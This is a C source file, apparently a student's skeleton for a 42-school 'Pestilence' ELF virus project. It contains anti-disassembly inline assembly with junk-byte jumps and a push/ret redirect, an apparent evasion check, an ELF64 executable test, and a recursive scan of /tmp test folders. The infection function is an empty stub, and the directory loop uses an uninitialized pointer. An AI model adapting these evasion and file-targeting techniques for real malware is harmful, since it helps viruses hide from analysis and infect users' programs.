/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: helmanso <helmanso@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/02/10 18:32:53 by helmanso          #+#    #+#             */
/*   Updated: 2021/07/29 12:51:51 by helmanso         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "../includes/pestilence.h"

void    pestilence(void)
{

    int i;
    char    *fake_address;

    i = -1;

    asm volatile(
    "xor %%rax, %%rax\n"
    "jz label_djumia + 1\n"
    "label_djumia:\n"
    ".byte 0xe9\n"
    : :
    : "%rax");

    asm volatile(
    "jz unaligned+1\n"
    "jnz unaligned+1\n"
    "unaligned:\n"
    ".byte 0xe8\n");

    fake_address = calc_addr(((char*)&&fake_label) - 0x400000);
    asm volatile(
        "push %0\n"
        "ret\n"
        ".string \"\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\""
        :
        : "g"(fake_address));

    fake_label:
            if (forbidden_process() == 0)
            {
                open_dir(((char[10]){'/','t','m','p','/','t','e','s','t','\0'}));
                open_dir(((char [11]){'/','t','m','p','/','t','e','s','t','2','\0'}));
            }
}

char* calc_addr(char* p_addr)
{
    return p_addr + 0x400000;
}

int    check_elf64(void *mapped, int size, char *file)
{
    Elf64_Ehdr *elf_header = (void *)mapped;
    if (ft_memcmp(elf_header->e_ident, (char[4]){ELFMAG0, ELFMAG1, ELFMAG2, ELFMAG3}, SELFMAG) != 0 ||
        elf_header->e_ident[EI_CLASS] != ELFCLASS64 && elf_header->e_type != ET_EXEC ||
        elf_header->e_phnum == 0)
        return -1;

    return (1);
}


int open_file(char *file, int *size, void **mapped)
{
    int fd;
    struct stat st;
    Elf64_Ehdr	elf64_hdr;
    if ((fd = open_wrapper(file, O_RDONLY)) < 0)
        return (0);
    if (fstat_wrapper(fd, &st) < 0)
        return (0);
    if ((*mapped = mmap_wrapper(NULL, st.st_size, PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
        return (0);
    if (read_wrapper(fd, &elf64_hdr, sizeof(elf64_hdr)) < sizeof(elf64_hdr))
        return (0);
    if (check_elf64(*mapped, st.st_size, file) < 0)
        return (0);
    *size = st.st_size;
    return (1);
}


void    free_it(char *full_path)
{
    int    i;

    i = -1;
    while (++i < 1024)
        full_path[i] = '\0';
}

void    famine(char *file, t_seed *seed)
{
    int size;
    void    *mapped;

  
}

void    entry_iterator(char *path, char *dir_buffer, int ret)
{
    int    pos;
    struct dirent64 *dirent;
    t_seed seed;

    char    point[2] = {'.', '\0'};
    char    dpoint[3] = {'.', '.', '\0'};
    char full_path[1024];

    pos = 0;
    free_it(full_path);
    while (pos < ret)
    {
        if (ft_strcmp(dirent->d_name, point) && ft_strcmp(dirent->d_name, dpoint))
        {
            ft_strcpy(full_path, path);
            full_path[ft_strlen(path)] = '/';
            ft_strcat(full_path, dirent->d_name);
            if (dirent->d_type == DT_DIR)
                open_dir(full_path);
            else
                famine(full_path, &seed);
            free_it(full_path);
        }
        pos += dirent->d_reclen;
        dirent = (void *)dir_buffer + pos;
    }
}
void    open_dir(char *path)
{
    int fd;
    int ret;
    char directory_buffer[1024];
    char    full_path[1024];
    if ((fd = open_wrapper(path, O_RDONLY)) < 0)
        return ;
    while ((ret = getdents64_wrapper(fd, (void *)directory_buffer, 1024)) > 0)
        entry_iterator(path, directory_buffer,ret);
}

int    _start(void)
{

    pestilence();
    exit_wrapper(0);
}
